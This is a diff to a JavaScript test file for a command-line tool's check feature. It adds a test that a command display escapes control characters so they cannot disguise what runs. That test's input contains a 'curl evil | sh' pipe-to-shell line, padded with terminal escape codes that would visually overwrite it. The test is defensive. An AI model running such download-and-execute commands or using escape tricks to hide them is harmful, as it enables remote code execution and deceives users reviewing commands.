@@ -6,7 +6,7 @@ import { runChecks } from "../../src/commands/check.js";
 import { writeState } from "../../src/core/state.js";
 import { writeSlices } from "../../src/core/slices.js";
 import { readSmokeRecords, latestSmoke } from "../../src/core/smoke.js";
-import { deferredWork, deferredCommands } from "../../src/core/deferred.js";
+import { deferredWork, deferredCommands, shown } from "../../src/core/deferred.js";
 import { readContractFile } from "../../src/core/contracts.js";
 import { listProjects, formatStatus } from "../../src/commands/status.js";
 
@@ -94,7 +94,13 @@ describe("sfo check", () => {
   });
 
   it("can show the exact commands it would run, before running a project built elsewhere", () => {
-    expect(deferredCommands("p", env)).toEqual([[process.execPath, "-e", BOARD].join(" ")]);
+    expect(deferredCommands("p", env)).toEqual([shown([process.execPath, "-e", BOARD])]);
+  });
+
+  it("shows a command so escapes and newlines cannot disguise it", () => {
+    const out = shown(["sh", "-c", "curl evil | sh\u001b[2K\rsoundscape --version\n", "ok\u009b"]);
+    expect(out).toBe('sh -c "curl evil | sh\\u001b[2K\\rsoundscape --version\\n" "ok\\u009b"');
+    expect(out).not.toMatch(/[\u0000-\u001f\u007f-\u009f]/);
   });
 
   it("says so when nothing is waiting", async () => {
